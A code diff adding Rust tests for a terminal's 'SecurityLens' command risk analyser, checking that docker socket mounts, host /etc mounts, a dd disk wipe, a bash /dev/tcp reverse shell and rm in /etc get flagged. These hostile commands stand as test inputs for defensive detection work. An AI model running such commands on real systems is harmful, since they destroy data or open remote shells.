@@ -122,3 +122,67 @@ fn rate_limit_exceeded_after_threshold() {
     assert!(matches!(risk.level, RiskLevel::Warning));
     assert!(risk.explanation.to_lowercase().contains("rate limit"));
 }
+
+// --- New tests for additional Security Lens patterns ---
+
+#[test]
+fn docker_sock_mount_is_warning() {
+    let mut lens = SecurityLens::new(default_policy());
+    let risk = lens.analyze_command("docker run -v /var/run/docker.sock:/var/run/docker.sock alpine:latest");
+    assert_eq!(risk.level, RiskLevel::Warning);
+    #[cfg(feature = "security-lens")]
+    assert!(risk
+        .factors
+        .iter()
+        .any(|f| f.category == "container_docker_sock"));
+}
+
+#[test]
+fn sensitive_host_mount_is_critical() {
+    let mut lens = SecurityLens::new(default_policy());
+    let risk = lens.analyze_command("docker run -v /etc:/etc alpine:latest");
+    assert_eq!(risk.level, RiskLevel::Critical);
+    #[cfg(feature = "security-lens")]
+    assert!(risk
+        .factors
+        .iter()
+        .any(|f| f.category == "container_sensitive_mount"));
+}
+
+#[test]
+fn disk_overwrite_dd_is_critical() {
+    let mut lens = SecurityLens::new(default_policy());
+    let risk = lens.analyze_command("dd if=/dev/zero of=/dev/sda bs=1M");
+    assert_eq!(risk.level, RiskLevel::Critical);
+}
+
+#[test]
+fn reverse_shell_bash_tcp_is_warning() {
+    let mut lens = SecurityLens::new(default_policy());
+    let risk = lens.analyze_command("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1");
+    assert!(matches!(risk.level, RiskLevel::Warning | RiskLevel::Critical));
+}
+
+#[test]
+fn context_sensitive_directory_upgrades_risk() {
+    use std::path::PathBuf;
+    use openagent_terminal_core::tty::pty_manager::{PtyAiContext, ShellKind};
+
+    let mut lens = SecurityLens::new(default_policy());
+
+    let ctx = PtyAiContext {
+        working_directory: PathBuf::from("/etc"),
+        shell_kind: ShellKind::Bash,
+        last_command: None,
+        shell_executable: "bash".into(),
+    };
+
+    // A simple rm becomes more risky in /etc
+    let risk = lens.analyze_command_with_context("rm hosts", Some(&ctx));
+    assert!(matches!(risk.level, RiskLevel::Warning | RiskLevel::Caution));
+    #[cfg(feature = "security-lens")]
+    assert!(risk
+        .factors
+        .iter()
+        .any(|f| f.category == "context_sensitive_directory"));
+}
